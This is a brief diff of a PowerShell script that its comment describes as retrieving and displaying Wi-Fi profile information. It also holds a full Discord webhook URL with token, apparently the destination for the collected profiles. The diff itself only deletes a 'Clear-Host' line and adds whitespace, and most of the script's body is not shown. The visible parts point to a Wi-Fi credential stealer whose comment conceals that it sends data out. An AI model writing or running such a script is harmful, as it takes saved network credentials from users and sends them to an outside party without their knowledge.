@@ -1,5 +1,4 @@
 # PowerShell script to retrieve and display Wi-Fi profile information for all networks
-Clear-Host
 # Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1207091234233917531/BWDZRfw1D1u-384nkTsF1ZBeWHfz97bEb81erdnjUg-y8QMAwlL6iKbPO1Xd8AAMP1IY"
 
@@ -35,6 +34,7 @@ $wifiProfiles -split '\r?\n' | ForEach-Object {
         }
     }
 }
+
 
 
 
